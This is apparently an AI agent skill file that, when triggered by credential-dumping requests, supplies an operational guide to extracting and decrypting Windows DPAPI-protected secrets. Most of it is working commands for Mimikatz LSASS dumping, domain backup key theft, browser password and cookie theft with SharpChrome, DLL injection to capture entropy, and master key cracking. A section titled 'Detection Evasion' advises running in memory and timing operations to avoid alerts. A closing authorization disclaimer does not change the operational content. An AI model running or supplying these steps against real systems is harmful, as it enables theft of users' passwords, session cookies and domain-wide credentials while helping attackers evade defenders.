---
name: dpapi-credential-extraction
description: How to extract and decrypt Windows DPAPI-protected credentials and secrets. Use this skill whenever the user needs to access DPAPI-encrypted data, extract master keys, decrypt credential blobs, work with Chrome/Edge cookies, or perform offline DPAPI decryption. Trigger on mentions of DPAPI, Windows credential extraction, master key decryption, Chrome password extraction, SharpDPAPI, Mimikatz DPAPI, or any Windows credential dumping scenario.
---

# DPAPI Credential Extraction

A comprehensive guide for extracting and decrypting Windows DPAPI-protected credentials and secrets. This skill covers master key extraction, credential decryption, browser credential access, and offline analysis workflows.

## Quick Start

**For current user session (no password needed):**
```bash
SharpDPAPI.exe triage /unprotect
```

**For offline analysis with password/hash:**
```bash
SharpDPAPI.exe triage /target:C:\path\to\credentials /password:USER_PASSWORD
# or
SharpDPAPI.exe triage /target:C:\path\to\credentials /ntlm:NTLM_HASH
```

**For Chrome/Edge cookies:**
```bash
SharpChrome cookies /browser:chrome /unprotect
```

## Understanding DPAPI

### What is DPAPI

The Data Protection API (DPAPI) encrypts data using keys derived from user credentials or system secrets. Key concepts:

- **User keys**: Derived from user's NTLM hash (SHA1-based)
- **Master keys**: Generated per encryption operation, stored in `%APPDATA%\Microsoft\Protect\<SID>\<GUID>`
- **Machine keys**: Based on `DPAPI_SYSTEM` LSA secret, accessible only locally
- **Entropy**: Optional third parameter some apps use (Outlook, VPN clients, etc.)

### Key Storage Locations

**User master keys:**
```
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>
C:\Users\<username>\AppData\Local\Microsoft\Protect\<SID>\<GUID>
```

**Credential blobs:**
```
C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\<hex>
C:\Users\<username>\AppData\Local\Microsoft\Credentials\<hex>
```

**Vault data:**
```
C:\Users\<username>\AppData\Roaming\Microsoft\Vault\<SID>\<GUID>
```

## Master Key Extraction Methods

### Method 1: Domain Backup Key (Domain Admin)

If you have domain admin access, extract the domain backup key to decrypt all user master keys:

```bash
# Mimikatz
mimikatz lsadump::backupkeys /system:<DC_IP> /export

# SharpDPAPI
SharpDPAPI.exe backupkey /server:DC.domain /file:key.pvk
```

### Method 2: LSASS Memory Dump (Local Admin)

Extract DPAPI keys from LSASS memory:

```bash
# Mimikatz - extracts all logged-on users' DPAPI keys
mimikatz sekurlsa::dpapi

# Output includes credkey (SHA1) for each user session
```

### Method 3: User Password/Hash

If you know the user's password or NTLM hash:

```bash
# Mimikatz with password
mimikatz dpapi::masterkey /in:<MASTERKEY_PATH> /sid:<USER_SID> /password:<PASSWORD>

# Mimikatz with NTLM hash
mimikatz dpapi::masterkey /in:<MASTERKEY_PATH> /sid:<USER_SID> /ntlm:<HASH>

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
SharpDPAPI.exe masterkeys /ntlm:HASH
```

### Method 4: RPC to Domain Controller

If user is logged in and you have local admin:

```bash
# Mimikatz
mimikatz dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

### Method 5: Machine/System Keys

For machine-scoped data (scheduled tasks, Wi-Fi, services):

```bash
# Mimikatz - requires SYSTEM or admin with DACL modification
mimikatz lsadump::secrets

# Offline from registry hives
reg save HKLM\SYSTEM C:\Temp\system.hiv
reg save HKLM\SECURITY C:\Temp\security.hiv
mimikatz lsadump::secrets /system:C:\Temp\system.hiv /security:C:\Temp\security.hiv
```

## Credential Decryption Workflows

### Workflow 1: Current User Session (Easiest)

No password needed - uses current session:

```bash
# Full triage (credentials, vaults, RDC, certificates)
SharpDPAPI.exe triage /unprotect

# Specific credential types
SharpDPAPI.exe credentials /unprotect
SharpDPAPI.exe vaults /unprotect
SharpDPAPI.exe rdg /unprotect
SharpDPAPI.exe keepass /unprotect
SharpDPAPI.exe certificates /unprotect
```

### Workflow 2: Offline with Password/Hash

You have the master key file and user credentials:

```bash
# Using password
SharpDPAPI.exe triage /target:C:\Users\bob\AppData\Roaming\Microsoft\Protect\<SID> /password:UserPass123

# Using NTLM hash
SharpDPAPI.exe triage /target:C:\Users\bob\AppData\Roaming\Microsoft\Protect\<SID> /ntlm:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117af069bb29b29b29b

# Using domain backup key
SharpDPAPI.exe triage /target:C:\Users\bob\AppData\Roaming\Microsoft\Protect\<SID> /pvk:domain_backup.pvk
```

### Workflow 3: Impacket (Python, Cross-Platform)

For offline analysis on Linux/macOS:

```bash
# Step 1: Decrypt master key
python3 dpapi.py masterkey -file <GUID_FILE> -sid S-1-5-21-XXX-XXX-XXX-1001 -password 'UserPassword'
# or
python3 dpapi.py masterkey -file <GUID_FILE> -sid S-1-5-21-XXX-XXX-XXX-1001 -key 0x<NTLM_HASH>

# Step 2: Decrypt credential blob
python3 dpapi.py credential -file <CREDENTIAL_FILE> -key 0x<MASTERKEY_HEX>
```

### Workflow 4: Using Credkey from LSASS

If you dumped LSASS and have the credkey (SHA1):

```bash
# SharpDPAPI
SharpDPAPI.exe triage /credkey:SHA1_HEX_VALUE

# SharpChrome
SharpChrome logins /browser:edge /prekey:SHA1_HEX_VALUE
```

## Browser Credential Extraction

### SharpChrome Quick Commands

**Current user, interactive:**
```bash
# Logins
SharpChrome logins /browser:chrome /unprotect
SharpChrome logins /browser:edge /unprotect
SharpChrome logins /browser:firefox /unprotect

# Cookies
SharpChrome cookies /browser:chrome /format:csv /unprotect
SharpChrome cookies /browser:edge /format:json /unprotect
```

**Offline with Local State file:**
```bash
# Extract AES state key from Local State
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect

# Use state key to decrypt cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

**Remote with domain backup key:**
```bash
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins /server:HOST01 /browser:chrome /pvk:key.pvk
```

### Chrome 127+ App-Bound Cookies

Newer Chrome versions use additional app-bound encryption:

```bash
# Run as target user to auto-resolve app-bound key
SharpChrome cookies /browser:chrome /unprotect

# Offline requires both DPAPI masterkey AND app-bound key from Credential Manager
```

## Handling Entropy (Third-Party Entropy)

Some applications (Outlook, VPN clients) use custom entropy:

### Capture Entropy with EntropyCapture

```powershell
# Inject into target process
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Decrypt with captured entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<HASH>
```

### Zscaler Case Study

Zscaler uses custom entropy derived from SID + hardcoded secret:

```csharp
// Entropy = XOR(hardcoded_secret, SID) then XOR halves together
byte[] entropy = RebuildEntropy(secret, sid);
byte[] clear = ProtectedData.Unprotect(blob, entropy, DataProtectionScope.LocalMachine);
```

## Master Key Cracking

### Hashcat Modes (v6.2.6+)

- **22100**: DPAPI masterkey v1 context 0
- **22101**: DPAPI masterkey v1 context 1  
- **22102**: DPAPI masterkey v1 context 3 (Windows 10 1607+)

### Using DPAPISnoop

```bash
# Parse master keys and generate hashcat format
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc

# Crack with hashcat
hashcat -m 22102 bob.hc wordlist.txt -O -w4

# Auto-decrypt with cracked keys
DPAPISnoop.exe credential-decrypt C:\Users\bob\AppData\Roaming\Microsoft\Credentials\<file> --masterkey <cracked_key>
```

## Remote Operations

### SharpDPAPI Remote Triage

```bash
# Requires admin access + domain backup key or password
SharpDPAPI.exe triage /server:TARGET_HOST /pvk:BASE64
SharpDPAPI.exe triage /server:TARGET_HOST /password:ADMIN_PASSWORD
```

### SharpChrome Remote

```bash
SharpChrome cookies /server:TARGET_HOST /browser:edge /pvk:BASE64
SharpChrome logins /server:TARGET_HOST /browser:chrome /pvk:key.pvk
```

## Detection Evasion Considerations

### Common Detections

- File access to `Microsoft\Protect\*`, `Microsoft\Credentials\*`
- LSASS memory access (Mimikatz, procdump)
- Event 4662: Access to BCKUPKEY object
- Event 4673/4674: SeTrustedCredManAccessPrivilege
- Tool signatures (Mimikatz, SharpDPAPI)

### Mitigation Strategies

- Use legitimate tools (SharpDPAPI is .NET, less suspicious than Mimikatz)
- Run from memory where possible
- Time operations during normal business hours
- Use domain backup key to avoid LSASS access
- Consider Impacket for cross-platform (no Windows tools needed)

## Tool Reference

### SharpDPAPI Options

```
Decryption:
  /unprotect          - Use CryptUnprotectData() (current session)
  /pvk:FILE           - Domain backup key file
  /pvk:BASE64         - Base64 domain backup key
  /password:X         - Plaintext password
  /ntlm:X             - NTLM hash
  /credkey:X          - DPAPI credkey (SHA1)
  /rpc                - Query domain controller
  /entropy:FILE       - Custom entropy file
  /mkfile:FILE        - GUID:SHA1 masterkey pairs

Targeting:
  /target:FILE/folder - Specific file or folder
  /server:HOST        - Remote server (requires admin)

Commands:
  credentials, vaults, rdg, keepass, certificates, triage, blob, ps, masterkeys, backupkey, machinetriage
```

### Mimikatz DPAPI Commands

```
dpapi::masterkey /in:FILE /sid:SID /password:PASS /ntlm:HASH /rpc
dpapi::cred /in:FILE /masterkey:KEY
dpapi::blob /in:FILE /unprotect /entropy:FILE
sekurlsa::dpapi
lsadump::backupkeys /system:DC /export
lsadump::secrets
```

### Impacket dpapi.py

```bash
# Master key decryption
dpapi.py masterkey -file <GUID> -sid <SID> -password <PASS> | -key 0x<HASH>

# Credential decryption
dpapi.py credential -file <CRED> -key 0x<MASTERKEY>
```

## Common Scenarios

### Scenario 1: You have local admin, user is logged in

```bash
# Best: Use LSASS credkey
mimikatz sekurlsa::dpapi
# Copy credkey, then:
SharpDPAPI.exe triage /credkey:SHA1_HEX
```

### Scenario 2: You have user password/hash, offline

```bash
# Find master key files
Get-ChildItem C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>

# Decrypt with password
SharpDPAPI.exe triage /target:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID> /password:PASSWORD
```

### Scenario 3: Domain admin, want all users

```bash
# Get domain backup key
SharpDPAPI.exe backupkey /server:DC.domain /file:backup.pvk

# Decrypt all users
SharpDPAPI.exe triage /pvk:backup.pvk
```

### Scenario 4: Chrome cookies, offline analysis

```bash
# Extract state key
SharpChrome statekeys /target:"C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Local State" /unprotect

# Decrypt cookies
SharpChrome cookies /target:"C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:HEX_KEY /format:json
```

## Safety and Legal Considerations

⚠️ **Only use these techniques on systems you own or have explicit authorization to test.**

- Unauthorized credential extraction is illegal
- Document all authorization before testing
- Follow responsible disclosure if finding vulnerabilities
- Be aware of data privacy regulations (GDPR, etc.)

## References

- [SharpDPAPI GitHub](https://github.com/GhostPack/SharpDPAPI)
- [Impacket dpapi.py](https://github.com/fortra/impacket)
- [DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [EntropyCapture](https://github.com/SpecterOps/EntropyCapture)
- [DonPAPI 2.x](https://github.com/login-securite/DonPAPI)
- [CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [Chrome App-Bound Cookies](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
